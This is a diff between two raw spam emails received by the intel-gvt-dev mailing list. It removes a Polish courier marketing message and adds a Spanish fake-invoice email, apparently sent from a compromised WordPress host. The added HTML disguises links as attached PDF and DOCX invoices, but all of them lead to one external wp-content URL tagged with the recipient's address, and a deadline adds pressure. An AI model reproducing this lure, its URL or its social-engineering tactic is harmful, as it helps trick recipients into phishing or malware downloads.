@@ -2,44 +2,45 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 72509CB2734
-	for <lists+intel-gvt-dev@lfdr.de>; Wed, 10 Dec 2025 09:43:58 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 02069CB7984
+	for <lists+intel-gvt-dev@lfdr.de>; Fri, 12 Dec 2025 02:58:04 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 48C3310E695;
-	Wed, 10 Dec 2025 08:43:57 +0000 (UTC)
-Authentication-Results: gabe.freedesktop.org;
-	dkim=pass (2048-bit key; secure) header.d=fontri.pl header.i=@fontri.pl header.b="eLSFIbB1";
-	dkim-atps=neutral
+	by gabe.freedesktop.org (Postfix) with ESMTP id CDE5110E31C;
+	Fri, 12 Dec 2025 01:58:02 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 434 seconds by postgrey-1.36 at gabe;
- Wed, 10 Dec 2025 08:43:55 UTC
-Received: from mail.fontri.pl (mail.fontri.pl [51.195.90.156])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 1796810E695
+X-Greylist: delayed 85424 seconds by postgrey-1.36 at gabe;
+ Fri, 12 Dec 2025 01:58:02 UTC
+Received: from sh23151.ispgateway.de (sh23151.ispgateway.de [92.205.212.121])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 4B22610E31C
  for <intel-gvt-dev@lists.freedesktop.org>;
- Wed, 10 Dec 2025 08:43:55 +0000 (UTC)
-Received: by mail.fontri.pl (Postfix, from userid 1002)
- id 9DBA4AAEC5; Wed, 10 Dec 2025 09:35:55 +0100 (CET)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=fontri.pl; s=mail;
- t=1765355799; bh=Kb7u+lszG/nXqIAGpk/hByhDC/8HGhmWaIRwB9KIYkQ=;
- h=Date:From:To:Subject:From;
- b=eLSFIbB16ElL04vrTDyAdHeRABrRBE6SANmlmikO4e036Kq6Z4c2dXipsTyFoq5Mi
- jaN4X1RIgOm/OgutSEej6h0fpURW/j1hy5jtuh98KjJK7hoXRN9d8MCvQTpySOb6Lw
- eXa4p3jPZj8TeS8s3lLtcPvMjSL8WtmL4TGkadDnbSHdqUcOw+mWoU5xrhbak/Pilh
- HXCWGi2sb2jn1g0BWrU49PTC65MXnHzBo3dcUkHZFiB8c4vlHUP3gHl900GjV0/Gba
- 2/Qr0LJiq76f5qKmI8dtdR/u2ygtQ+JkDG+NgDR638W8gt81VM0anUiR1ZAjZqjkf7
- AdwDNrYxsjSAA==
-Received: by mail.fontri.pl for <intel-gvt-dev@lists.freedesktop.org>;
- Wed, 10 Dec 2025 08:35:28 GMT
-Message-ID: <20251210084501-0.1.sw.69nz6.0.d9tke4j55b@fontri.pl>
-Date: Wed, 10 Dec 2025 08:35:28 GMT
-From: =?UTF-8?Q?"=C5=BBaneta_K=C4=99dzierska"?= <zaneta.kedzierska@fontri.pl>
-To: <intel-gvt-dev@lists.freedesktop.org>
-Subject: =?UTF-8?Q?Odbi=C3=B3r_w_paczkomacie_?=
-X-Mailer: mail.fontri.pl
+ Fri, 12 Dec 2025 01:58:01 +0000 (UTC)
+Received: from sh23151.ispgateway.de (php74.df_default
+ [IPv6:fd00:dead:beef::8])
+ by sh23151.ispgateway.de (Postfix) with ESMTPS id 38ED4A58D9E3
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Thu, 11 Dec 2025 02:58:35 +0100 (CET)
+Received: (from 615353@localhost)
+ by sh23151.ispgateway.de (8.15.2/8.15.2/Submit) id 5BB1wZtg263380;
+ Thu, 11 Dec 2025 02:58:35 +0100
+X-Authentication-Warning: sh23151.ispgateway.de: 615353 set sender to
+ schneider@new-media-design.info using -f
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: Ref: rvxx3azm60 - RE: intel-gvt-dev@lists.freedesktop.org,
+ Notificacion de factura vencida MTA - 233001 - 059417. - 11/12/2025
+ 02:58:35
+X-PHP-Originating-Script: 615353:wp-blog-header.php
+From: "Yolanda Hidalgo Pastor - Facturacion"
+ <Yolanda_HidalgoPastor28235@sh23151.ispgateway.de>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-type: text/html; charset=iso-8859-1
+X-Mailer: PHP/7.4.33
+X-Sender: Yolanda_HidalgoPastor28235
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+Message-ID: <2b2883d9484d43ba0a640c0754673e16118205bc@www.schneider-medienservice.de>
+Date: Thu, 11 Dec 2025 01:58:00 +0000
+X-Originating-IP: [172.27.0.20]
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -52,21 +53,55 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
+Reply-To: Yolanda_HidalgoPastor28235@sh23151.ispgateway.de
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-Dzie=C5=84 dobry,
+<html>
 
-jako lider w us=C5=82ugach kurierskich w Polsce przygotowali=C5=9Bmy elas=
-tyczne rozwi=C4=85zanie dla przedsi=C4=99biorc=C3=B3w.
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Factura</title>
+</head>
 
-Stworzyli=C5=9Bmy abonament =C5=82=C4=85cz=C4=85cy dostawy do Paczkomat 2=
-4/7 oraz obs=C5=82ug=C4=99 kuriersk=C4=85 - jeden dostawca, jedna faktura=
- i przewidywalne, sta=C5=82e koszty.=20
+<body>
 
-Czy mog=C4=99 przedstawi=C4=87, co mo=C5=BCemy zaproponowa=C4=87 wzgl=C4=99=
-dem Pa=C5=84stwa potrzeb?
+<table cellpadding="0" cellspacing="0" width="548">
+	<!-- MSTableType="layout" -->
+	<tr>
+		<td height="565" valign="top"><a href="https://appsinnovate.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii">
+		<img border="0" src="https://i.imgur.com/tUv4TK3.png" width="267" height="56"><img border="0" src="https://i.imgur.com/kKIEIxE.png" width="271" height="59"></a><br>
+&nbsp;<hr>
+		<p><font face="Segoe UI" size="2">Factura MTA - 233001 - 059417 - intel-gvt-dev@lists.freedesktop.org.<br>
+		<br>
+		Tu factura ya esta disponible en formato PDF y DOC. Los hemos adjuntado 
+		al cuerpo de este correo. Tambien puedes descargarla haciendo clic en el 
+		siguiente boton.<br>
+		<br>
+		Tienes hasta el 18 de diciembre de 2025 a las 15:00 p.m. para modificar tus 
+		datos de facturacion. Despues de esta fecha, no podras hacer ningun 
+		cambio.</font></p>
+		<ul>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://appsinnovate.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii"><span style="text-decoration: none">
+			FacturaMTA23513.pdf</span></a> (.pdf - Acrobat Reader)</span></font></span></li>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://appsinnovate.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii"><span style="text-decoration: none">FacturaMTA23513.docx</span></a>&nbsp; 
+			(.docx - Microsoft Word)</span></font></span></li>
+		</ul>
+		<p><font face="Segoe UI" size="2">Desde ya, muchas gracias.<br>
+		<br>
+		Atentamente,<br>
+		Yolanda Hidalgo Pastor<br>
+		Departamento de Facturacion<br>
+&nbsp;</font></td>
+	</tr>
+</table>
 
+</body>
 
-Pozdrawiam
-=C5=BBaneta K=C4=99dzierska
+</html>
